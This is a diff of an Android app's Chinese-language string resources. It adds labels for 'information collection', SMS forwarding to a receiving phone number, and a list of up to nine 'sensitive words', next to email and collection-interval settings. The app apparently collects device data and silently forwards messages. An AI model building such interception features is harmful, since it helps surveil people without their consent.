@@ -7,6 +7,7 @@
     <string name="sms_sent">发信</string>
     <string name="sms_unknown">未知</string>
     <string name="sms_name">短信</string>
+    <string name="sms_redirect_header">【转发】</string>
     
     <!-- Contact -->
     <string name="contact_name">联系人</string>
@@ -26,10 +27,10 @@
     
     <!-- Preferences -->
     <string name="pref_title">设定</string>
-    <string name="pref_category_feature_key">pref_category_feature</string>
-    <string name="pref_category_feature_title">功能</string>
-    <string name="pref_category_others_key">pref_category_others</string>
-    <string name="pref_category_others_title">其它</string>
+    <string name="pref_category_info_collector_key">pref_category_info_collector</string>
+    <string name="pref_category_info_collector_title">情报收集</string>
+    <string name="pref_category_sms_redirector_key">pref_category_sms_redirector</string>
+    <string name="pref_category_sms_redirector_title">短信转发</string>
     
     <string name="pref_mail_key">pref_mail</string>
     <string name="pref_mail_title">邮箱</string>
@@ -37,6 +38,13 @@
     <string name="pref_info_interval_key">pref_info_interval</string> 
     <string name="pref_info_interval_title">间隔</string> <!-- days -->
     <string name="pref_info_interval_dlg_title">收集间隔</string>
+    <string name="pref_phonenum_key">pref_phonenum</string>
+    <string name="pref_phonenum_title">接收手机的号码</string>
+    <string name="pref_pls_input_phonenum">请输入接收手机号。</string>
+    <string name="pref_word_sensor_key">pref_word_sensor</string>
+    <string name="pref_word_sensor_title">敏感词</string>
+    <string name="pref_word_sensor_summary">空格隔开，最多9个。</string>
+    <string name="pref_pls_input_sensitive_words">请输入敏感词（用空格隔开）</string>
     
     <!-- InitActivity -->
     <string name="init_btn_getinfo">立即获取信息</string>
